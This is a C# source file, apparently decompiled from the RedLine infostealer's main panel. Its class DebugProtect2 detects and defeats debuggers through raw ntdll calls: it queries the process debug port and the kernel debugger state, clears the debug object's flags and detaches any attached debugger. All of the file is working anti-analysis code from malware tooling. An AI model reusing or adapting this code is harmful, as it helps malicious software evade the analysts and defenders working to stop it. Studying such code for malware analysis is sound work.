using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using RedLine.MainPanel.Models.Defense;

namespace RedLine.MainPanel.Data.Core;

internal class DebugProtect2
{
	private static readonly IntPtr intptr_0 = new IntPtr(-1);

	[DllImport("ntdll.dll", ExactSpelling = true, SetLastError = true)]
	internal static extern NtStatus NtQueryInformationProcess([In] IntPtr ProcessHandle, [In] ProcessInfoClass ProcessInformationClass, out IntPtr ProcessInformation, [In] int ProcessInformationLength, [Optional] out int ReturnLength);

	[DllImport("ntdll.dll", ExactSpelling = true, SetLastError = true)]
	internal static extern NtStatus NtClose([In] IntPtr Handle);

	[DllImport("ntdll.dll", ExactSpelling = true, SetLastError = true)]
	internal static extern NtStatus NtRemoveProcessDebug(IntPtr ProcessHandle, IntPtr DebugObjectHandle);

	[DllImport("ntdll.dll", ExactSpelling = true, SetLastError = true)]
	internal static extern NtStatus NtSetInformationDebugObject([In] IntPtr DebugObjectHandle, [In] DebugObjectInformationClass DebugObjectInformationClass, [In] IntPtr DebugObjectInformation, [In] int DebugObjectInformationLength, [Optional] out int ReturnLength);

	[DllImport("ntdll.dll", ExactSpelling = true, SetLastError = true)]
	internal static extern NtStatus NtQuerySystemInformation([In] SystemInformationClass SystemInformationClass, IntPtr SystemInformation, [In] int SystemInformationLength, [Optional] out int ReturnLength);

	public static int PerformChecks()
	{
		if (smethod_0() == 1)
		{
			return 1;
		}
		if (smethod_2() == 0)
		{
			if (smethod_1() == 0)
			{
				return 0;
			}
			return 1;
		}
		return 1;
	}

	private static uint smethod_0()
	{
		IntPtr ProcessInformation = new IntPtr(0);
		if (NtQueryInformationProcess(Process.GetCurrentProcess().Handle, ProcessInfoClass.ProcessDebugPort, out ProcessInformation, Marshal.SizeOf(ProcessInformation), out var _) == NtStatus.Success && ProcessInformation == new IntPtr(-1))
		{
			return 1u;
		}
		return 0u;
	}

	private unsafe static uint smethod_1()
	{
		IntPtr ProcessInformation = intptr_0;
		uint structure = 0u;
		if (NtQueryInformationProcess(Process.GetCurrentProcess().Handle, ProcessInfoClass.ProcessDebugObjectHandle, out ProcessInformation, IntPtr.Size, out var _) != 0)
		{
			return 0u;
		}
		if (NtSetInformationDebugObject(ProcessInformation, DebugObjectInformationClass.DebugObjectFlags, new IntPtr(&structure), Marshal.SizeOf(structure), out var _) != 0)
		{
			return 0u;
		}
		if (NtRemoveProcessDebug(Process.GetCurrentProcess().Handle, ProcessInformation) != 0)
		{
			return 0u;
		}
		if (NtClose(ProcessInformation) != 0)
		{
			return 0u;
		}
		return 1u;
	}

	private unsafe static uint smethod_2()
	{
		SystemKernelDebuggerInformation structure = default(SystemKernelDebuggerInformation);
		if (NtQuerySystemInformation(SystemInformationClass.SystemKernelDebuggerInformation, new IntPtr(&structure), Marshal.SizeOf(structure), out var _) == NtStatus.Success && structure.KernelDebuggerEnabled && !structure.KernelDebuggerNotPresent)
		{
			return 1u;
		}
		return 0u;
	}
}
